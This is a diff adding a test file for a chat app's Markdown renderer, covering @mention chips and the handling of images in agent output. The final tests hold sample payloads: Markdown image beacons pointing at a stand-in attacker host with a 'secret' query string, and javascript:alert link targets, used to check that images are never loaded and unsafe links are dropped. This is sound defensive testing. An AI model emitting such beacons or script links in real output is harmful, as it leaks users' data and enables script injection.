@@ -1,0 +1,107 @@
+import { createElement } from 'react';
+import { renderToStaticMarkup } from 'react-dom/server';
+import { describe, expect, it } from 'vitest';
+import type { AgentConfig } from '../src/shared/types';
+import { parseMentions } from '../src/server/prompt';
+import { Markdown, findMentions } from '../src/web/components/Markdown';
+
+const html = (text: string, mentions = ['Claude', 'Bob']) => renderToStaticMarkup(createElement(Markdown, { text, mentions }));
+const chip = (name: string) => `<span class="mention">${name}</span>`;
+
+describe('@mention chips', () => {
+  it('highlights mentions in prose, but not in code or link text', () => {
+    expect(html('ask @Claude and @bob, or @user')).toContain(`ask ${chip('@Claude')} and ${chip('@bob')}, or ${chip('@user')}`);
+    expect(html('**@Claude** please')).toContain(`<strong>${chip('@Claude')}</strong>`);
+    const out = html(
+      [
+        'Inline `ask @Claude` here.',
+        '',
+        '~~~',
+        'ping @Claude',
+        '~~~',
+        '',
+        '````',
+        '```',
+        '@Claude inside a longer fence',
+        '````',
+        '',
+        '    @Claude in an indented block',
+        '',
+        '[ask @Claude](https://example.com)',
+      ].join('\n'),
+    );
+    expect(out).not.toContain('class="mention"');
+    expect(out).not.toContain('#mention');
+    expect(out).toContain('<code>ask @Claude</code>');
+    expect(out).toContain('>ask @Claude</a>');
+  });
+
+  it('follows the server rule for where a mention starts and ends', () => {
+    const agents: AgentConfig[] = ['Bob', 'Bobby', '小明', 'Builder'].map((name) => ({ id: name, name, provider: 'claude', role: '' }));
+    const names = agents.map((a) => a.name);
+    const texts = [
+      '@Builder請實作',
+      '請 @小明檢查',
+      '@Bobby and @Bob-x and @Bob.',
+      'mail bob@Bob.com, a.@Bob, @@Bob',
+      'x@Bob (@BOB) 「@Bob」',
+      '@Bobbyx @Bob_ @Bob!',
+    ];
+    for (const text of texts) {
+      const fromServer = parseMentions(text, agents).map((a) => a.name);
+      const found = findMentions(text, names).map(({ start, end }) => text.slice(start + 1, end).toLowerCase());
+      const chips = [...new Set(found)].map((n) => names.find((x) => x.toLowerCase() === n));
+      expect(chips, text).toEqual(fromServer);
+    }
+    expect(html('@Builder請實作', ['Builder'])).toContain(`${chip('@Builder')}請實作`);
+    expect(html('@Bobby', ['Bob'])).not.toContain('class="mention"');
+  });
+});
+
+describe('chips and the server agree on Markdown structure', () => {
+  const agents: AgentConfig[] = ['Claude', 'Builder', 'Bob'].map((name) => ({ id: name, name, provider: 'claude', role: '' }));
+  const names = agents.map((a) => a.name);
+  /** Names of the chips the UI renders, first appearance first. */
+  const chips = (text: string) =>
+    [...new Set([...html(text, names).matchAll(/<span class="mention">@([^<]+)<\/span>/g)].map((m) => m[1]!.toLowerCase()))].map(
+      (n) => names.find((x) => x.toLowerCase() === n)!,
+    );
+
+  it('in links, URLs, code of every kind, quotes, lists and emphasis', () => {
+    const texts = [
+      '[ask @Claude](https://x.example) then @Bob',
+      'see https://github.com/@Claude/x and mail bob@Builder.dev',
+      '    @Claude in indented code\n\nthen @Bob',
+      '> ```\n> @Claude\n> ```\n\n@Bob',
+      '1. step\n\n       ```java\n       @Builder\n       ```\n\n2. @Bob',
+      '`two-line\n@Claude code` and @Bob',
+      '_@Claude_ and __@Bob__ and _note_@Builder',
+      '@Builder請實作，@Claude 檢查',
+      '```ts\nconst a = "@Builder";',
+    ];
+    for (const text of texts) expect(chips(text), text).toEqual(parseMentions(text, agents).map((a) => a.name));
+    // A Java annotation in a code block inside a list does not hand the floor to @Builder.
+    expect(parseMentions(texts[4]!, agents).map((a) => a.name)).toEqual(['Bob']);
+  });
+});
+
+describe('images in agent output', () => {
+  it('are links, never loaded', () => {
+    const out = html('![tracker](https://evil.example/beacon.png?d=secret) and ![](https://evil.example/2.png)');
+    expect(out).not.toContain('<img');
+    expect(out).toContain('<a href="https://evil.example/beacon.png?d=secret" class="image-link" target="_blank" rel="noreferrer">tracker</a>');
+    expect(out).toContain('>https://evil.example/2.png</a>');
+    // Unsafe targets are still dropped.
+    expect(html('[x](javascript:alert(1)) ![y](javascript:alert(2))')).not.toContain('javascript:');
+  });
+
+  it('covers reference images and images inside links, without nesting links', () => {
+    const ref = html('![logo][l]\n\n[l]: https://evil.example/l.png');
+    expect(ref).not.toContain('<img');
+    expect(ref).toContain('href="https://evil.example/l.png"');
+    const badge = html('[![build](https://evil.example/badge.svg)](https://ci.example)');
+    expect(badge).not.toContain('<img');
+    expect(badge).not.toContain('evil.example');
+    expect(badge.match(/<a /g)).toHaveLength(1);
+  });
+});
